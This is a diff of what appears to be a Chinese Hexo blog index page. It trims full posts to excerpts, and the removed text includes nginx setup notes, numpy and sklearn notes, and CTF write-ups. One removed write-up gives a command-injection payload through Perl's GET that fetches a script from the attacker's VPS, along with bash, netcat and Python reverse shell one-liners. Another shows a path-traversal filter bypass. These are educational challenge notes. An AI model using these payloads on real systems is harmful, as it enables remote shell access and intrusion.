@@ -416,7 +416,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:15:54" itemprop="dateModified" datetime="2019-03-02T23:15:54+08:00">2019-03-02</time>
               
             
           </span>
@@ -489,51 +489,19 @@
 
       
         
+          <p>nginx快餐<br>
+          <!--noindex-->
           
-            <h1 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>apt install nginx</code></p>
-<p><code>pip install uwsgi</code></p>
-<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul>
-<li><p>创建uwsgi的配置文件</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="comment">#项目的位置</span></span><br><span class="line"><span class="attr">chdir</span> = /home/yy/code/project/py/flask-nginx/<span class="literal">on</span>linetools</span><br><span class="line"></span><br><span class="line"><span class="comment">#要运行的文件</span></span><br><span class="line"><span class="attr">wsgi-file</span> = /home/yy/code/project/py/flask-nginx/<span class="literal">on</span>linetools/main.py</span><br><span class="line"><span class="comment">#要调用的函数</span></span><br><span class="line"><span class="attr">callable</span> = app</span><br><span class="line"></span><br><span class="line"><span class="comment"># python的虚拟路径</span></span><br><span class="line"><span class="attr">home</span> = /home/yy/code/project/py/flask-nginx/<span class="literal">on</span>linetools/venv</span><br><span class="line"></span><br><span class="line"><span class="comment">#socket file's location</span></span><br><span class="line"><span class="attr">socket</span> = /home/yy/code/project/py/n.sock</span><br><span class="line"><span class="comment">#permissions for the socket file</span></span><br><span class="line"><span class="attr">chmod-socket</span>    = <span class="number">666</span></span><br></pre></td></tr></table></figure>
-<p><code>uwsgi --ini uwsgi.ini</code></p>
-</li>
-<li><p>配置 nginx.conf </p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen      8000;</span><br><span class="line">    server_name localhost;</span><br><span class="line">    charset     utf-8;</span><br><span class="line">    client_max_body_size 75M;</span><br><span class="line"></span><br><span class="line">    location ^~ /static &#123;</span><br><span class="line">        root /home/yy/code/project/py/flask-nginx/onlinetools/cmsscan; # static的上层目录</span><br><span class="line">        expires 30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix://home/yy/code/project/py/n.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ul>
-<li>首先删除默认的配置 <code>sudo rm /etc/nginx/sites-enabled/default</code></li>
-<li>然后将写的配置建立软连接 <code>sudo ln -s /home/yy/code/project/py/nginx/nginx.conf /etc/nginx/conf.d</code></li>
-</ul>
-<ul>
-<li>关于如何配置静态资源的路径以及一些其他的配置：<a href="https://my.oschina.net/u/238296/blog/599706" target="_blank" rel="noopener">https://my.oschina.net/u/238296/blog/599706</a></li>
-</ul>
-<h3 id="配置uwsgi可以一直运行"><a href="#配置uwsgi可以一直运行" class="headerlink" title="配置uwsgi可以一直运行"></a>配置uwsgi可以一直运行</h3><ul>
-<li><code>nohup uwsgi --ini config2.ini &amp;</code></li>
-</ul>
-<h3 id="nginx停止与开始"><a href="#nginx停止与开始" class="headerlink" title="nginx停止与开始"></a>nginx停止与开始</h3><p><code>sudo /etc/init.d/nginx stop</code></p>
-<p><code>sudo /etc/init.d/nginx start</code></p>
-<h3 id="nginx其他命令"><a href="#nginx其他命令" class="headerlink" title="nginx其他命令"></a>nginx其他命令</h3><ul>
-<li><p>查看nginx路径</p>
-<ul>
-<li><code>ps aux|grep nginx</code></li>
-</ul>
-</li>
-<li><p>查看nginx配置文件路径</p>
-<ul>
-<li><code>/usr/local/opt/nginx/bin/nginx -t</code></li>
-</ul>
-</li>
-</ul>
-<h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><ul>
-<li>manjaro上，始终是502，将sock文件更换目录……权限问题……尚未有更好方法</li>
-<li>无法加载静态资源，使nginx以root/项目用户  启动……尚未有其他方案；在配置文件添加：<code>user o1hy</code></li>
-</ul>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/10/28/nginx/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
 
     
 
@@ -647,7 +615,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:16:25" itemprop="dateModified" datetime="2019-03-02T23:16:25+08:00">2019-03-02</time>
               
             
           </span>
@@ -713,15 +681,19 @@
 
       
         
+          <p>快餐<br>
+          <!--noindex-->
           
-            <h1 id="0x00-例子"><a href="#0x00-例子" class="headerlink" title="0x00 例子"></a>0x00 例子</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">page = requests.get(<span class="string">'http://econpy.pythonanywhere.com/ex/001.html'</span>)</span><br><span class="line">tree = html.fromstring(page.text)</span><br><span class="line"></span><br><span class="line">buyers = tree.xpath(<span class="string">'/html/body/div/div/text()'</span>)</span><br><span class="line"><span class="comment"># 这将创建prices的列表：</span></span><br><span class="line">prices = tree.xpath(<span class="string">'//span[@class="item-price"]/text()'</span>)</span><br><span class="line"><span class="comment"># /html/body/div[5]/div /html/body/div[5] /html/body/script/text()</span></span><br><span class="line">print(buyers)</span><br><span class="line">print(prices)</span><br></pre></td></tr></table></figure>
-<h1 id="0x01-Xpath-语法"><a href="#0x01-Xpath-语法" class="headerlink" title="0x01 Xpath 语法"></a>0x01 Xpath 语法</h1><h2 id="XML-实例文档"><a href="#XML-实例文档" class="headerlink" title="XML 实例文档"></a>XML 实例文档</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"eng"</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"eng"</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="E7799025DC564312A87677C77B3CD29E" alt="image"><br><img src="7CF6FAE8B47042779EA8C81EC24AF9F0" alt="image"><br><img src="9F93C074B04A413EBC6F5FD6A37E36B4" alt="image"><br><img src="6ADB6FFE727C4AD8BF9F2B42C8DF15DF" alt="image"></p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/10/28/Xpath/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
 
     
 
@@ -1233,7 +1205,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:17:32" itemprop="dateModified" datetime="2019-03-02T23:17:32+08:00">2019-03-02</time>
               
             
           </span>
@@ -1299,26 +1271,16 @@
 
       
         
+          <h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 题目描述"></a>0x00 题目描述</h1><p>php的 <code>shell_exec</code> 执行了 <code>GET</code> 命令。<br>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求</p>
+          <!--noindex-->
           
-            <h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 题目描述"></a>0x00 题目描述</h1><p>php的 <code>shell_exec</code> 执行了 <code>GET</code> 命令。<br>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>最主要就是<code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code></p>
-<p>漏洞在于 GET 可以执行命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="string">'ls|'</span> <span class="comment"># 此命令我只在vps上执行成功。而 kali和ubuntu18创建后的内容均不可以。</span></span><br></pre></td></tr></table></figure></p>
-<p>vps:<br><img src="CC1DB461E0374CD282ADDED8FF873BBF" alt="image"><br>ubuntu与kali(多了2个单引号):<br><img src="15AEAB38D73045658EB89AD598F4F116" alt="image"><br>当创建好文件后，使用如下命令就可以执行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="string">'file:ls|'</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="2CD36734625743E29B20B19A247196C4" alt="image"><br>而刚才多了单引号的则不可以。<br><img src="FEC1A9D0DC854EBCB410C2DC8A6322C2" alt="image">  </p>
-<h1 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02 解决"></a>0x02 解决</h1><p>所以需要在服务端的执行一个bash脚本用来反弹shell。<br>在服务端的执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="string">'file:bash a|'</span></span><br></pre></td></tr></table></figure></p>
-<p>所以需要在服务器创建<strong>2</strong>个文件。一个名字是<code>bash a|</code>，另一个是<code>a|</code>。其中<code>a|</code>中是要执行的脚本。  </p>
-<p><strong>payload</strong>为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=http://yourvps/a.txt&amp;filename=a</span><br><span class="line">?url=&amp;filename=bash a|</span><br><span class="line">?url=file:bash a|&amp;filename=xxx</span><br></pre></td></tr></table></figure></p>
-<p><strong>a.txt</strong>的内容是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_vps/port 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
-<h1 id="0x03-反弹脚本"><a href="#0x03-反弹脚本" class="headerlink" title="0x03 反弹脚本"></a>0x03 反弹脚本</h1><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><code>bash -i</code>是打开一个交互的bash.<br><code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在<code>/dev/udp/</code>  </p>
-<p>要想了解<code>&gt;&amp;</code>和<code>0&gt;&amp;1</code>，首先我们要先了解一下Linux文件描述符和重定向。<br><code>&gt;&amp;</code>或者<code>&amp;&gt;</code>将错误和输出均重定向。  </p>
-<h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><p>如果目标主机支持“-e”选项的话，我们就可以直接用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 10.42.0.1 1234</span><br></pre></td></tr></table></figure></p>
-<p>否则，现在自己的vps上监听两个端口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 1234 -vv</span><br><span class="line">nc -l -p 4321 -vv</span><br></pre></td></tr></table></figure></p>
-<p>然后在目标主机上执行以下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  10.42.0.1 1234  |  /bin/bash  |  nc 10.42.0.1 4321</span><br></pre></td></tr></table></figure></p>
-<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -c<span class="string">" </span></span><br><span class="line"><span class="string">import socket,subprocess,os;</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">s.connect(("</span>10.42.0.1<span class="string">",1234));</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),1); </span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">p=subprocess.call(["</span>/bin/bash<span class="string">","</span>-i<span class="string">"]);"</span></span><br></pre></td></tr></table></figure>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/09/30/GET命令漏洞/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
@@ -1627,7 +1589,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:17:55" itemprop="dateModified" datetime="2019-03-02T23:17:55+08:00">2019-03-02</time>
               
             
           </span>
@@ -1693,23 +1655,17 @@
 
       
         
-          
-            <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>文件包含,nginx配置读取</p>
+          <h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>文件包含,nginx配置读取</p>
 <p><strong>title:</strong> 百度杯2017二月-Zone</p>
-<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>首先找到了文件包含的漏洞.</p>
-<p><img src="1.png" alt="image"></p>
-<p>发现无法使用伪协议读取.同时,module后面的路径会过滤,将 <code>../</code> 过滤为 <code>空</code>.所以需要构造 <code>..././</code> 可以绕过.</p>
-<p><img src="2.png" alt="image"></p>
-<p>读取nginx配置文件.  </p>
-<p><img src="3.png" alt="image"></p>
-<p>发现最后还有一个包含,继续读.<br><img src="4.png" alt="image"></p>
-<p>发现内容<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /online-movies &#123;</span><br><span class="line">            <span class="attribute">alias</span> /movie/; <span class="comment"># 改变地址</span></span><br><span class="line">            <span class="attribute">autoindex</span> <span class="literal">on</span>; <span class="comment"># 文件夹读取</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
-<p>会把 <code>/online-movies../</code>变为 <code>/moive/../</code> </p>
-<p><img src="5.png" alt="image"></p>
-<p><img src="6.png" alt="image"></p>
-<p>伪协议不可用是因为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"/var/html/"</span>.$module....</span><br></pre></td></tr></table></figure></p>
-
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/09/15/Nginx配置不当/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1826,7 +1782,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:18:16" itemprop="dateModified" datetime="2019-03-02T23:18:16+08:00">2019-03-02</time>
               
             
           </span>
@@ -1892,14 +1848,19 @@
 
       
         
+          <p>SVM简单公式系列<br>
+          <!--noindex-->
           
-            <p><img src="1.jpg" alt="img"></p>
-<p><img src="2.jpg" alt="img"></p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/09/15/SVM支持向量机/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
 
     
 
@@ -2013,7 +1974,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:19:00" itemprop="dateModified" datetime="2019-03-02T23:19:00+08:00">2019-03-02</time>
               
             
           </span>
@@ -2079,22 +2040,19 @@
 
       
         
+          <p>快餐<br>
+          <!--noindex-->
           
-            <h1 id="Numpy基础"><a href="#Numpy基础" class="headerlink" title="Numpy基础"></a>Numpy基础</h1><h2 id="矩阵以及运算"><a href="#矩阵以及运算" class="headerlink" title="矩阵以及运算"></a>矩阵以及运算</h2><h3 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h3><p>首先,我认为,只需要两组数,就可以代表空间.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line">print(np.shape(a)) <span class="comment"># (2,)</span></span><br><span class="line">a = [[<span class="number">1</span>, <span class="number">0</span>]] </span><br><span class="line">print(np.shape(a)) <span class="comment"># (1,2)</span></span><br><span class="line">a = [[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line">print(np.shape(a)) <span class="comment"># (2,2)</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">而对于有多个矩阵的,类似于数组</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">a = [[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">2</span>, <span class="number">2</span>]]]</span><br><span class="line">print(np.shape(a)) <span class="comment"># (1,2,2)</span></span><br><span class="line">a = [[[<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]], [[<span class="number">2</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2</span>]]]</span><br><span class="line">print(np.shape(a)) <span class="comment"># (2,2,2)  ---&gt; 2个2*2的矩阵</span></span><br><span class="line"></span><br><span class="line">c = np.array([[[[<span class="number">5</span>],</span><br><span class="line">                [<span class="number">14</span>]],</span><br><span class="line">               [[<span class="number">14</span>],</span><br><span class="line">                [<span class="number">50</span>]]]])</span><br><span class="line">print(c.shape) <span class="comment"># (1, 2, 2, 1)   ----&gt; 1个(2个2*2矩阵)           </span></span><br><span class="line">print(c.reshape(<span class="number">4</span>)) <span class="comment"># [ 5 14 14 50]</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><h4 id="np-dot"><a href="#np-dot" class="headerlink" title="np.dot()"></a>np.dot()</h4><p>矩阵乘法</p>
-<h4 id="np-outer"><a href="#np-outer" class="headerlink" title="np.outer()"></a>np.outer()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[[1,2],[1,1]] * [[2,3],[1,3]] </span></span><br><span class="line"><span class="string">===&gt; 先化成一维矩阵 </span></span><br><span class="line"><span class="string">[1,2,1,1] * [2,3,1,3]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">1</span>]])</span><br><span class="line">b = np.array([[<span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">3</span>]])</span><br><span class="line">np.outer(a, b)</span><br><span class="line"><span class="comment">#array([[2, 3, 1, 3],</span></span><br><span class="line"><span class="comment">#       [4, 6, 2, 6],</span></span><br><span class="line"><span class="comment">#       [2, 3, 1, 3],</span></span><br><span class="line"><span class="comment">#       [2, 3, 1, 3]])</span></span><br></pre></td></tr></table></figure>
-<h4 id="np-multiply"><a href="#np-multiply" class="headerlink" title="np.multiply()"></a>np.multiply()</h4><p>为对应元素的乘积。</p>
-<h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><h2 id="数字特征"><a href="#数字特征" class="headerlink" title="数字特征"></a>数字特征</h2><h3 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X = np.array([[<span class="number">1.</span>, <span class="number">-1.</span>, <span class="number">2.</span>], [<span class="number">2.</span>, <span class="number">0.</span>, <span class="number">0.</span>], [<span class="number">0.</span>, <span class="number">1.</span>, <span class="number">-1.</span>]])</span><br><span class="line">X_scaled = preprocessing.scale(X)</span><br><span class="line">print(X_scaled)</span><br></pre></td></tr></table></figure>
-<h3 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X = np.array([[<span class="number">1.</span>, <span class="number">-1.</span>, <span class="number">2.</span>], [<span class="number">2.</span>, <span class="number">0.</span>, <span class="number">0.</span>], [<span class="number">0.</span>, <span class="number">1.</span>, <span class="number">-1.</span>]])</span><br><span class="line">X_scaled = preprocessing.normalize(X, norm=<span class="string">'l2'</span>)</span><br><span class="line">print(X_scaled)</span><br></pre></td></tr></table></figure>
-<h3 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">X = np.array([[<span class="number">1.</span>, <span class="number">-1.</span>, <span class="number">2.</span>], [<span class="number">2.</span>, <span class="number">0.</span>, <span class="number">0.</span>], [<span class="number">0.</span>, <span class="number">1.</span>, <span class="number">-1.</span>]])</span><br><span class="line">min_max_scaler = preprocessing.MinMaxScaler()</span><br><span class="line">X_train_minmax = min_max_scaler.fit_transform(X)</span><br><span class="line">print(X_train_minmax)</span><br></pre></td></tr></table></figure>
-<h2 id="文本型特征"><a href="#文本型特征" class="headerlink" title="文本型特征"></a>文本型特征</h2><p><a href="http://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.CountVectorizer.html#sklearn.feature_extraction.text.CountVectorizer" target="_blank" rel="noopener">官方文档</a><br><a href="http://sklearn.apachecn.org/cn/latest/modules/feature_extraction.html" target="_blank" rel="noopener">中文文档</a></p>
-<h1 id="数据读取"><a href="#数据读取" class="headerlink" title="数据读取"></a>数据读取</h1><p>可以读取 <code>csv</code> 数据</p>
-<h1 id="效果验证"><a href="#效果验证" class="headerlink" title="效果验证"></a>效果验证</h1><h2 id="交叉验证"><a href="#交叉验证" class="headerlink" title="交叉验证"></a>交叉验证</h2><p><a href="http://sklearn.apachecn.org/cn/latest/modules/cross_validation.html" target="_blank" rel="noopener">中文文档</a></p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/09/15/机器学习概述/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
-    </div>
+    </p></div>
 
     
 
@@ -2208,7 +2166,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-02 19:52:17" itemprop="dateModified" datetime="2019-02-02T19:52:17+08:00">2019-02-02</time>
+                <time title="Modified: 2019-03-02 23:22:55" itemprop="dateModified" datetime="2019-03-02T23:22:55+08:00">2019-03-02</time>
               
             
           </span>
@@ -2274,18 +2232,16 @@
 
       
         
+          <h1 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>sql注入 + % 报错<br><img src="1.png" alt="1536150551652"></p>
+          <!--noindex-->
           
